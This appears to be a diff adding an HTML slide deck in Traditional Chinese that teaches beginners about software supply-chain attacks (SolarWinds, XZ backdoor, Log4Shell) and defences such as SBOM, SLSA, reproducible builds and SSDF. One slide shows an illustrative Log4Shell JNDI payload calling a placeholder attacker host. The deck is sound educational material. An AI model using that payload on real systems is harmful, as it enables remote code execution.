@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="zh-Hant-TW">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>軟體供應鏈安全入門｜資安週報簡報</title>
+  <meta name="description" content="給完全不熟資安的人：用 SolarWinds、XZ、Log4Shell 三個案例認識軟體供應鏈攻擊與防禦。">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="stylesheet" href="../assets/slides.css">
+</head>
+<body class="deck">
+  <nav class="deck-nav"><a href="../index.html">← 資安週報</a></nav>
+
+  <!-- 每張投影片的事實都來自 data-wiki 指到的 Wiki 頁（CLAUDE.md 第 9 節） -->
+
+  <section class="slide" id="s1" data-part="cover" data-wiki="index.md">
+    <p class="kicker">資安週報・教學簡報</p>
+    <h1>你的程式，<br>怎麼被別人的程式害到？</h1>
+    <p class="lead">軟體供應鏈安全入門：三個案例、四種防禦</p>
+    <p>往下捲動換頁 ↓</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/index.html">Wiki 目錄</a></p>
+  </section>
+
+  <section class="slide" id="s2" data-part="goals" data-wiki="index.md">
+    <p class="kicker">學習目標</p>
+    <h2>看完這份簡報，你能夠…</h2>
+    <ol>
+      <li>用一句話說明什麼是<strong>軟體供應鏈攻擊</strong>。</li>
+      <li>說出三種攻擊入口，各舉一個真實案例。</li>
+      <li>說出四種防禦方法，以及它們分別在防什麼。</li>
+    </ol>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/index.html">Wiki 目錄</a></p>
+  </section>
+
+  <section class="slide" id="s3" data-part="prereq" data-wiki="concepts/supply-chain-attack.md">
+    <p class="kicker">先備概念 1</p>
+    <h2>什麼是「軟體供應鏈」？</h2>
+    <div class="callout">
+      <p>🍜 餐廳很注意廚房衛生，但沒人檢查供應商送來的醬料。<br>醬料工廠一旦被動手腳，所有用這款醬料的餐廳一起中毒。</p>
+    </div>
+    <p>你寫的程式也一樣：它用到別人寫的函式庫、別人做的工具、別人發布的更新。這一整串「上游」，就是<strong>軟體供應鏈</strong>。</p>
+    <p><strong>供應鏈攻擊</strong>：不直接攻擊你，而是污染你信任的上游，讓惡意程式跟著正常更新一起進來。</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/supply-chain-attack.html">軟體供應鏈攻擊</a></p>
+  </section>
+
+  <section class="slide" id="s4" data-part="prereq" data-wiki="concepts/supply-chain-attack.md">
+    <p class="kicker">先備概念 2</p>
+    <h2>被攻破的不是程式，是「信任」</h2>
+    <ul class="cards c3">
+      <li class="card"><strong>信任簽章</strong><br>有官方簽章的更新，電腦就會放行。</li>
+      <li class="card"><strong>信任發布檔</strong><br>官網下載的安裝檔，很少人會再檢查內容。</li>
+      <li class="card"><strong>信任熱門套件</strong><br>大家都在用的元件，很少人會懷疑。</li>
+    </ul>
+    <p>攻擊者只要拿下其中一環，就能一次影響所有下游使用者。</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/supply-chain-attack.html">軟體供應鏈攻擊</a></p>
+  </section>
+
+  <section class="slide" id="s5" data-part="prereq" data-wiki="concepts/supply-chain-attack.md">
+    <p class="kicker">先備概念 3</p>
+    <h2>三種常見入口</h2>
+    <div class="table-wrap"><table>
+      <tr><th>入口</th><th>白話</th><th>案例</th></tr>
+      <tr><td>建置 / 發布流程被入侵</td><td>醬料工廠的生產線被動手腳</td><td>SolarWinds</td></tr>
+      <tr><td>維護者身分被滲透</td><td>壞人應徵進醬料工廠當主管</td><td>XZ 後門</td></tr>
+      <tr><td>被廣泛依賴的元件有漏洞</td><td>醬料配方本身有問題</td><td>Log4Shell</td></tr>
+    </table></div>
+    <p>接下來一個一個看。</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/supply-chain-attack.html">軟體供應鏈攻擊</a></p>
+  </section>
+
+  <section class="slide" id="s6" data-part="case" data-wiki="events/solarwinds.md">
+    <p class="kicker">案例 1｜建置流程被入侵</p>
+    <h2>SolarWinds：用官方憑證簽章的後門</h2>
+    <ol>
+      <li>攻擊者把惡意 DLL 放進 SolarWinds Orion 的軟體生命週期。</li>
+      <li>這個檔案由 SolarWinds <strong>合法的程式碼簽章憑證</strong>簽署。</li>
+      <li>客戶照常安裝更新，後門連到偽裝成正常流量的網域，等待指令。</li>
+    </ol>
+    <ul class="cards c2">
+      <li class="card"><strong>開始時間</strong><br>至少 2020 年 3 月</li>
+      <li class="card"><strong>公開</strong><br>2020-12-13 美國 CISA 發布緊急指令，要求聯邦機關中斷受影響設備</li>
+    </ul>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/events/solarwinds.html">SolarWinds</a></p>
+  </section>
+
+  <section class="slide" id="s7" data-part="case" data-wiki="events/xz-backdoor.md">
+    <p class="kicker">案例 2｜維護者身分被滲透</p>
+    <h2>XZ 後門：維護者親手發布的後門</h2>
+    <ul>
+      <li>取得發布權限的維護者帳號，在 xz <strong>5.6.0</strong> 與 <strong>5.6.1</strong> 的發布檔中植入後門（CVE-2024-3094，CVSS 10.0）。</li>
+      <li>觸發後門的程式碼<strong>從沒進過 Git</strong>，只在發布用的 tarball 裡；另一部分偽裝成測試檔。</li>
+      <li>因為部分 Linux 發行版讓 SSH 伺服器間接連到這個壓縮函式庫，後門可能影響 SSH 登入。</li>
+    </ul>
+    <div class="callout">
+      <p>🔍 怎麼被發現的？工程師注意到 SSH 登入變慢：<span class="big">0.30</span> 秒 → <span class="big">0.81</span> 秒，追查後在 2024-03-29 公開。</p>
+    </div>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/events/xz-backdoor.html">XZ 後門</a></p>
+  </section>
+
+  <section class="slide" id="s8" data-part="case" data-wiki="events/log4shell.md">
+    <p class="kicker">案例 3｜熱門元件有漏洞</p>
+    <h2>Log4Shell：一行日誌就能執行程式</h2>
+    <p>Log4j2 是 Java 的日誌函式庫，它會<strong>解析</strong>日誌內容中的特殊語法：</p>
+<pre><code>logger.info("登入失敗：" + username);
+
+// 若 username 是（示意）：
+//   ${jndi:ldap://attacker.example/x}
+// 受影響的 Log4j2 會連到該 LDAP 伺服器，
+// 載入並執行對方指定的程式</code></pre>
+    <ul>
+      <li>CVE-2021-44228，CVSS 10.0；2.0-beta9 起的版本受影響。</li>
+      <li>修補了好幾輪，Java 8 以上請升到 <strong>2.17.1</strong> 以上。</li>
+    </ul>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/events/log4shell.html">Log4Shell</a></p>
+  </section>
+
+  <section class="slide" id="s9" data-part="compare" data-wiki="events/solarwinds.md events/xz-backdoor.md events/log4shell.md">
+    <p class="kicker">比較</p>
+    <h2>三個案例，同一個結構</h2>
+    <div class="table-wrap"><table>
+      <tr><th></th><th>SolarWinds</th><th>XZ 後門</th><th>Log4Shell</th></tr>
+      <tr><td>年份</td><td>2020 年</td><td>2024 年</td><td>2021 年</td></tr>
+      <tr><td>被信任的東西</td><td>官方簽章的更新</td><td>維護者發布的 tarball</td><td>人人都用的日誌元件</td></tr>
+      <tr><td>蓄意植入？</td><td>是</td><td>是</td><td>否，是漏洞</td></tr>
+      <tr><td>下游怎麼中招</td><td>安裝正常更新</td><td>取得含後門的發布檔</td><td>程式把使用者輸入寫進日誌</td></tr>
+    </table></div>
+    <p class="callout">共同點：<strong>一個上游出事，所有信任它的下游一起受影響。</strong></p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/events/solarwinds.html">SolarWinds</a><a href="../wiki/events/xz-backdoor.html">XZ 後門</a><a href="../wiki/events/log4shell.html">Log4Shell</a></p>
+  </section>
+
+  <section class="slide" id="s10" data-part="defense" data-wiki="concepts/sbom.md">
+    <p class="kicker">防禦 1｜知道自己用了什麼</p>
+    <h2>SBOM：軟體的成分表</h2>
+    <div class="callout"><p>🥫 食品有成分表，過敏的人一看就知道能不能吃。</p></div>
+    <p><strong>SBOM</strong>（Software Bill of Materials）列出一個軟體由哪些元件組成。</p>
+    <ul>
+      <li>出事時第一個問題：「我們有沒有用到？」→ 查清單就知道。</li>
+      <li>搭配 <strong>VEX</strong>：說明「有用到，但不一定受影響」，避免一律恐慌。</li>
+    </ul>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/sbom.html">SBOM</a></p>
+  </section>
+
+  <section class="slide" id="s11" data-part="defense" data-wiki="concepts/slsa.md">
+    <p class="kicker">防禦 2｜證明是怎麼做出來的</p>
+    <h2>SLSA：分級的「產銷履歷」</h2>
+    <div class="table-wrap"><table>
+      <tr><th>等級</th><th>白話</th><th>防什麼</th></tr>
+      <tr><td>L0</td><td>沒有履歷</td><td>—</td></tr>
+      <tr><td>L1</td><td>農夫自己手寫履歷</td><td>發布流程出錯（但容易偽造）</td></tr>
+      <tr><td>L2</td><td>公正檢驗所出具並蓋章</td><td>建置<strong>完成後</strong>被竄改</td></tr>
+      <tr><td>L3</td><td>檢驗所本身也有嚴格門禁</td><td>建置<strong>過程中</strong>被竄改，含內部人員</td></tr>
+    </table></div>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/slsa.html">SLSA</a></p>
+  </section>
+
+  <section class="slide" id="s12" data-part="defense" data-wiki="concepts/reproducible-builds.md">
+    <p class="kicker">防禦 3｜任何人都能驗證</p>
+    <h2>可重現建置</h2>
+    <div class="callout"><p>🎂 照著公開食譜做蛋糕，做出來跟店家賣的一模一樣，就能確定店家沒偷加東西。</p></div>
+    <p>同一份原始碼，任何人建置都得到<strong>完全相同</strong>的二進位檔 → 第三方可以驗證下載到的檔案沒被竄改。</p>
+    <p class="callout warn">⚠️ 限制：如果「原始碼」本身就有問題（像 XZ 的 tarball），重現出來的結果一樣有後門。還要比對發布檔和 Git 原始碼是否一致。</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/reproducible-builds.html">可重現建置</a></p>
+  </section>
+
+  <section class="slide" id="s13" data-part="defense" data-wiki="concepts/ssdf.md">
+    <p class="kicker">防禦 4｜從開發流程做起</p>
+    <h2>SSDF：整間工廠的品管制度</h2>
+    <p>美國 NIST 的安全軟體開發框架，分四組實務：</p>
+    <ul class="cards c4">
+      <li class="card"><strong>PO 準備組織</strong><br>人、流程、技術都準備好</li>
+      <li class="card"><strong>PS 保護軟體</strong><br>元件不被竄改或未授權存取</li>
+      <li class="card"><strong>PW 產出安全的軟體</strong><br>發布的版本漏洞最少</li>
+      <li class="card"><strong>RV 回應漏洞</strong><br>處理發布後的漏洞、避免再發生</li>
+    </ul>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/ssdf.html">SSDF</a></p>
+  </section>
+
+  <section class="slide" id="s14" data-part="revisit" data-wiki="concepts/slsa.md concepts/reproducible-builds.md concepts/sbom.md events/log4shell.md">
+    <p class="kicker">回到案例</p>
+    <h2>哪個防禦，對哪個案例有幫助？</h2>
+    <div class="table-wrap"><table>
+      <tr><th>案例</th><th>最相關的防禦</th><th>為什麼</th></tr>
+      <tr><td>SolarWinds</td><td>SLSA L3</td><td>惡意程式在建置過程中被加入，只靠簽章不夠，要證明建置過程可信</td></tr>
+      <tr><td>XZ 後門</td><td>比對發布檔與 Git</td><td>後門觸發碼只在 tarball；單靠可重現建置抓不到</td></tr>
+      <tr><td>Log4Shell</td><td>SBOM ＋ 升級</td><td>先查出「哪裡用到」，再升級到 2.17.1 以上</td></tr>
+    </table></div>
+    <p class="lead">沒有一種防禦能擋住全部，所以要組合使用。（本表為 Wiki 歸納的推論）</p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/concepts/slsa.html">SLSA</a><a href="../wiki/concepts/reproducible-builds.html">可重現建置</a><a href="../wiki/concepts/sbom.html">SBOM</a><a href="../wiki/events/log4shell.html">Log4Shell</a></p>
+  </section>
+
+  <section class="slide quiz" id="s15" data-part="quiz" data-wiki="events/solarwinds.md concepts/sbom.md concepts/reproducible-builds.md">
+    <p class="kicker">小測驗</p>
+    <h2>點開看答案</h2>
+    <details>
+      <summary>Q1. SolarWinds 的後門為什麼能通過客戶的檢查？</summary>
+      <p>因為它由 SolarWinds 合法的程式碼簽章憑證簽署，看起來就是正常的官方更新。</p>
+    </details>
+    <details>
+      <summary>Q2. 一個熱門元件爆出漏洞，組織第一個要回答的問題是什麼？靠什麼回答？</summary>
+      <p>「我們有沒有用到它？」靠 SBOM（軟體成分表）快速查出來。</p>
+    </details>
+    <details>
+      <summary>Q3. 只拿 XZ 的發布 tarball 做可重現建置，能發現後門嗎？</summary>
+      <p>不能。tarball 本身就含有後門，重現的結果一樣有問題；要比對 tarball 和 Git 原始碼。</p>
+    </details>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/events/solarwinds.html">SolarWinds</a><a href="../wiki/concepts/sbom.html">SBOM</a><a href="../wiki/concepts/reproducible-builds.html">可重現建置</a></p>
+  </section>
+
+  <section class="slide" id="s16" data-part="recap" data-wiki="index.md">
+    <p class="kicker">重點回顧</p>
+    <h2>三句話帶走</h2>
+    <ol>
+      <li>供應鏈攻擊打的是<strong>信任</strong>：簽章、發布檔、熱門元件。</li>
+      <li>三種入口：建置流程、維護者身分、元件漏洞。</li>
+      <li>防禦要組合：SBOM 知道用了什麼、SLSA 與可重現建置證明沒被改、SSDF 從流程做起。</li>
+    </ol>
+    <p>想看完整資料與來源 → <a href="../wiki/index.html">軟體供應鏈安全 LLM Wiki</a></p>
+    <p class="wiki-ref">Wiki 依據：<a href="../wiki/index.html">Wiki 目錄</a></p>
+  </section>
+</body>
+</html>
